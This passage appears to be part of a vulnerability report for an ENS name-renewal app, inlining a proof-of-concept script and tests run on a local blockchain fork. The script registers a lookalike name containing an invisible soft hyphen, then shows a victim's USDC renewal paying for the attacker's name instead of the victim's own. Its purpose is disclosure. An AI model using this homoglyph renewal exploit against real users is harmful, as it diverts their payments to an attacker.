const R = chain.contracts.ensEthRegistrar.address, USDC = chain.contracts.usdc.address
const VICTIM='0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57', ATTACKER='0x70997970C51812dc3A010C7d01b50e0d17dc79C8'
const YEAR=31557600n, VIC='crypto', VAR='crypto­', SECRET='0x'+'ad'.repeat(32)
const ABI = parseAbi([
 'function makeCommitment(string label,address owner,bytes32 secret,address subregistry,address resolver,uint64 duration,bytes32 referrer) view returns (bytes32)',
 'function commit(bytes32 commitment)',
 'function register(string label,address owner,bytes32 secret,address subregistry,address resolver,uint64 duration,address paymentToken,bytes32 referrer)',
 'function renew(string label,uint64 duration,address paymentToken,bytes32 referrer)',
 'function approve(address,uint256) returns (bool)',
 'function balanceOf(address) view returns (uint256)'])
const rpc=(m,p)=>pub.request({method:m,params:p})
const bal=a=>pub.readContract({address:USDC,abi:ABI,functionName:'balanceOf',args:[a]})
const exp=async l=>String(await getExpiry(pub,{name:`${l}.eth`}))
const send=async(from,to,data)=>{ try{ const h=await rpc('eth_sendTransaction',[{from,to,data,gas:'0x1c9c380'}])
  return (await pub.waitForTransactionReceipt({hash:h})).status }catch(e){ return 'ERR '+(e.shortMessage||e.message).split('\n')[0].slice(0,140) } }
const out={}
out.strings = { urlName: JSON.stringify(`${VAR}.eth`), codepoints: [...`${VAR}.eth`].map(c=>c.codePointAt(0).toString(16)).join(' '),
  ens_normalize: normalize(`${VAR}.eth`), lowercase: `${VAR}.eth`.toLowerCase(),
  note: 'rendered-width comparison lives in render-width-measurement.json; not computed here' }
for (const a of [VICTIM,ATTACKER]) { await rpc('anvil_impersonateAccount',[a]); await rpc('anvil_setBalance',[a,'0x56bc75e2d63100000']); await rpc('anvil_setCode',[a,'0x']) }
out.before={ expiry_victim: await exp(VIC), expiry_variant: await exp(VAR), usdc_victim: String(await bal(VICTIM)),
  owner_of_normalized: (await getOwner(pub,{name:normalize(`${VAR}.eth`)})) }
out.registerPrice = JSON.stringify(await getRegisterPrice(pub,{label:VAR,duration:YEAR,paymentToken:USDC,owner:ATTACKER}),(k,v)=>typeof v==='bigint'?String(v):v)
const c = await pub.readContract({address:R,abi:ABI,functionName:'makeCommitment',args:[VAR,ATTACKER,SECRET,zeroAddress,zeroAddress,YEAR,zeroHash]})
out.commit = await send(ATTACKER,R,encodeFunctionData({abi:ABI,functionName:'commit',args:[c]}))
await rpc('evm_increaseTime',[300]); await rpc('evm_mine',[])
out.attacker_approve = await send(ATTACKER,USDC,encodeFunctionData({abi:ABI,functionName:'approve',args:[R,1_000_000_000n]}))
out.register = await send(ATTACKER,R,encodeFunctionData({abi:ABI,functionName:'register',args:[VAR,ATTACKER,SECRET,zeroAddress,zeroAddress,YEAR,USDC,zeroHash]}))
out.afterRegister={ expiry_victim: await exp(VIC), expiry_variant: await exp(VAR) }
const rp = await getRenewPrice(pub,{renewerAddress:R,label:VAR,duration:YEAR,paymentToken:USDC}).catch(e=>({amount:0n}))
out.renewPrice = String(rp.amount)
const b4 = await bal(VICTIM)
out.victim_approve = await send(VICTIM,USDC,encodeFunctionData({abi:ABI,functionName:'approve',args:[R,rp.amount*2n]}))
out.victim_renew   = await send(VICTIM,R,encodeFunctionData({abi:ABI,functionName:'renew',args:[VAR,YEAR,USDC,zeroHash]}))
out.after={ expiry_victim: await exp(VIC), expiry_variant: await exp(VAR),
  usdc_spent_by_victim: String(b4-(await bal(VICTIM))),
  variant_gained_seconds: String(BigInt(await exp(VAR)) - BigInt(out.afterRegister.expiry_variant)),
  victim_name_gained_seconds: String(BigInt(await exp(VIC)) - BigInt(out.before.expiry_victim)) }
console.log(JSON.stringify(out,null,1))
```

`r29c.poc.test.ts` — the application's own modules on the renewal path (step B reads):

```ts
import { describe, expect, it, vi } from 'vitest'
import { createPublicClient, http, labelhash } from 'viem'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { sepolia } from 'viem/chains'

const forkClient = createPublicClient({
  chain: extendChainWithEns(sepolia),
  transport: http('http://127.0.0.1:8553', { timeout: 120_000 }),
})
vi.mock('@/lib/wagmi/helpers', async () => {
  const { ok } = await import('neverthrow')
  return { safeGetClient: () => ok(forkClient) }
})
vi.mock('@/lib/wagmi', async (importOriginal) => ({ ...(await importOriginal() as any), publicClient: forkClient }))
vi.mock('@ens-apps/indexer/urql', () => ({
  default: { query: () => ({ toPromise: async () => ({ data: { domain: null } }) }) },
}))

const { getExpiry } = await import('@/features/profile/service/profileExpiry')
const { parseRenewableName } = await import('@/features/renew/utils/renewableName')
const { getRenewPrice } = await import('@/features/renew/data/queries/renewPricing.query')
const { getOwner } = await import('@/features/profile/service/profileOwner')
const { isConnectedProfileOwner } = await import('@/features/profile/components/view/connectedAccounts.helpers')
const { getBaseRates } = await import('@ensdomains/ensjs/public/v2')
const { canRenewV2Name } = await import('@/features/renew/utils/renewableName')
const { isPastGracePeriod } = await import('@/features/grace/utils/gracePeriod')
const { profileExpiryDateFromSeconds } = await import('@/features/profile/service/profileExpiry')
const { shouldShowThirdPartyRenewalWarning } = await import('@/features/renew/utils/thirdPartyRenewalWarning')

const YEAR = 31557600n

describe('renew path: normalized reads vs raw label', () => {
  it('expiry+owner come from the normalized name, the renewed label does not', async () => {
    const out: any = {}
    for (const urlName of ['crypto.eth', 'crypto­.eth', 'ｃrypto.eth', 'cryptｏ.eth', 'crypto️.eth']) {
      const parsed = parseRenewableName(urlName)
      const label = parsed.isOk() ? parsed.value.label : `ERR ${String(parsed.error?.message)}`
      const expiry = await getExpiry(urlName)
      const owner = await getOwner({ name: urlName })
      let price = 'n/a'
      if (parsed.isOk()) {
        const p = await getRenewPrice(label, YEAR, 'USDC' as any, 'v2' as any)
        price = p.isOk() ? JSON.stringify(p.value, (_k, v) => typeof v === 'bigint' ? String(v) : v) : `ERR ${p.error?.constructor?.name}`
      }
      out[urlName] = {
        codepoints: [...urlName].map((c) => c.codePointAt(0)!.toString(16)).join(' '),
        parsedLabel: label,
        labelhash: parsed.isOk() ? labelhash(label) : null,
        ownerFromNormalized: (owner as any)?.value?.owner ?? null,
        expiryFromNormalized: String((expiry as any)?.value?.expiry ?? null),
        renewPriceForParsedLabel: price,
        loader_protocol: (expiry as any)?.value?.protocol ?? null,
        loader_pastGrace: isPastGracePeriod(profileExpiryDateFromSeconds((expiry as any)?.value?.expiry), 'v2'),
        loader_canRenewV2Name: canRenewV2Name(urlName, profileExpiryDateFromSeconds((expiry as any)?.value?.expiry)),
        isConnectedProfileOwner_forVictimWallet: isConnectedProfileOwner({
          owner: (owner as any)?.value?.owner,
          walletAddress: '0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57',
          accountAddress: undefined,
          ownerAddress: undefined,
        }),
      }
    }
    const rates = await getBaseRates(forkClient as any, {
      registrarAddress: (forkClient.chain as any).contracts.ensEthRegistrar.address,
      paymentToken: (forkClient.chain as any).contracts.usdc.address,
    })
    out._baseRatesPerSecond = rates.map(String)
    out._pricePerYearByLabelLength = rates.map((r: any) => String((BigInt(r) * YEAR) / 1000000n))
    const fs = await import('node:fs')
    fs.writeFileSync('r29c-out.json', JSON.stringify(out, null, 1))
    expect(Object.keys(out).length).toBe(7)
  }, 300_000)
})
```

`r30ui.poc.test.tsx` — the rendered `ProfileRenewAction`, both branches (step B render):

```tsx
import type { AnchorHTMLAttributes } from 'react'
import { describe, expect, it, vi } from 'vitest'
import { createPublicClient, http } from 'viem'
import { sepolia } from 'viem/chains'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'

const forkClient = createPublicClient({
  chain: extendChainWithEns(sepolia),
  transport: http('http://127.0.0.1:8553', { timeout: 120_000 }),
})

const linkCalls: any[] = []
vi.mock('@tanstack/react-router', () => ({
  Link: ({ children, ...props }: AnchorHTMLAttributes<HTMLAnchorElement>) => {
    linkCalls.push(props)
    return <a {...props}>{children}</a>
  },
  createLink: (Comp: any) => (props: any) => {
    linkCalls.push(props)
    return <Comp {...props} />
  },
}))
vi.mock('@/lib/wagmi/helpers', async () => {
  const { ok } = await import('neverthrow')
  return { safeGetClient: () => ok(forkClient) }
})
vi.mock('@/lib/wagmi', async (importOriginal) => ({
  ...((await importOriginal()) as any),
  publicClient: forkClient,
}))
vi.mock('@ens-apps/indexer/urql', () => ({
  default: { query: () => ({ toPromise: async () => ({ data: { domain: null } }) }) },
}))

const { render } = await import('@/utils/test-utils')
const { ProfileRenewAction } = await import('./ProfileRenewAction')

const VARIANT = 'crypto­.eth'

const dump = (label: string, html: string) => ({
  label,
  hasThirdPartyDialogCopy: /previous owner|do not own|someone else/i.test(html),
  renewButtonRendered: /Renew Name/i.test(html),
})

describe('ProfileRenewAction: dialog branch and emitted link', () => {
  it('isOwner true (what the normalized lookup returns) hides the third-party dialog and links to the raw name', async () => {
    const owned = render(
      <ProfileRenewAction className="x" isOwner={true} name={VARIANT} protocol="v2" />,
    )
    await new Promise((r) => setTimeout(r, 4000))
    const ownedHtml = owned.container.innerHTML
    const ownedLinks = [...linkCalls]
    linkCalls.length = 0

    const notOwned = render(
      <ProfileRenewAction className="x" isOwner={false} name={VARIANT} protocol="v2" />,
    )
    await new Promise((r) => setTimeout(r, 4000))
    const notOwnedHtml = notOwned.container.innerHTML

    const fs = await import('node:fs')
    fs.writeFileSync(
      'r30ui-out.json',
      JSON.stringify(
        {
          name: VARIANT,
          codepoints: [...VARIANT].map((c) => c.codePointAt(0)!.toString(16)).join(' '),
          isOwnerTrue: dump('isOwner=true', ownedHtml),
          linkProps: ownedLinks.map((p) => ({ to: p.to, params: p.params })),
          isOwnerFalse: dump('isOwner=false', notOwnedHtml),
          linkPropsWhenNotOwner: [...linkCalls].map((p) => ({ to: p.to, params: p.params })),
          notOwnerRendersDialogTrigger: /aria-haspopup="dialog"/.test(notOwnedHtml),
          ownerRendersDialogTrigger: /aria-haspopup="dialog"/.test(ownedHtml),
          notOwnedHtmlHead: notOwnedHtml.slice(0, 400),
        },
        null,
        1,
      ),
    )
    expect(ownedHtml.length + notOwnedHtml.length).toBeGreaterThan(0)
  }, 120_000)
})
```

`r30e2e.poc.test.ts` — the shipped renewal actor, driven, with the built request captured (step D):

```ts
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import fs from 'node:fs'
import { createPublicClient, decodeFunctionData, http, parseAbi } from 'viem'
import { sepolia } from 'viem/chains'
import { describe, expect, it, vi } from 'vitest'

const captured = vi.hoisted(() => [] as Array<Record<string, unknown>>)

vi.mock('@ens-apps/transaction-manager/providers/transactionManager', () => ({
  transactionManager: {
    startTransaction: (
      payload: Record<string, unknown>,
      _signer: unknown,
      opts: Record<string, unknown>,
    ) => {
      captured.push({ payload, opts })
      return 'captured-not-broadcast'
    },
  },
}))

const { submitRenewActor } = await import(
  '@ens-apps/transaction-manager/machines/registration/registration.actors'
)

const chain = extendChainWithEns(sepolia)
const publicClient = createPublicClient({
  chain,
  transport: http('http://127.0.0.1:8553', { timeout: 180_000 }),
})

const VICTIM = '0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57'
const signer = {
  type: 'eoa',
  walletClient: { account: { address: VICTIM } },
} as never

const YEAR = 31_557_600n
const RENEW_ABI = parseAbi([
  'function renew(string label,uint64 duration,address paymentToken,bytes32 referrer)',
])

const drive = async (label: string) => {
  captured.length = 0
  const res = await submitRenewActor({
    label,
    duration: YEAR,
    selectedToken: 'USDC' as never,
    signer,
    publicClient: publicClient as never,
  })
  const request = (captured[0]?.payload as { request?: Record<string, string> })
    ?.request
  const decoded = request?.data
    ? decodeFunctionData({ abi: RENEW_ABI, data: request.data as `0x${string}` })
    : undefined
  return {
    actorOk: res.isOk(),
    to: request?.to,
    from: request?.from,
    labelInCalldata: decoded?.args?.[0],
    durationInCalldata: String(decoded?.args?.[1] ?? ''),
    description: (captured[0]?.opts as { description?: string })?.description,
    calldataPrefix: String(request?.data).slice(0, 10),
  }
}

describe("submitRenewActor: the label the app puts on the wire", () => {
  it('carries the raw URL label into the renew calldata', async () => {
    const out: Record<string, unknown> = {}
    for (const label of ['crypto­', 'crypto']) {
      out[JSON.stringify(label)] = await drive(label)
    }
    out._codepoints = {
      variant: [...'crypto­'].map((c) => c.codePointAt(0)?.toString(16)),
      control: [...'crypto'].map((c) => c.codePointAt(0)?.toString(16)),
    }
    fs.writeFileSync('r30e2e-out.json', JSON.stringify(out, null, 1))
    expect(captured.length).toBeGreaterThan(0)
  }, 300_000)
})
```

length-budget-exemption: attachments are limited to PNG and JPEG, so a PoC meant to be rerun has to carry its own source inside the body. Section E inlines four scripts for that reason, and they are what puts the code count over the contest tripwire.
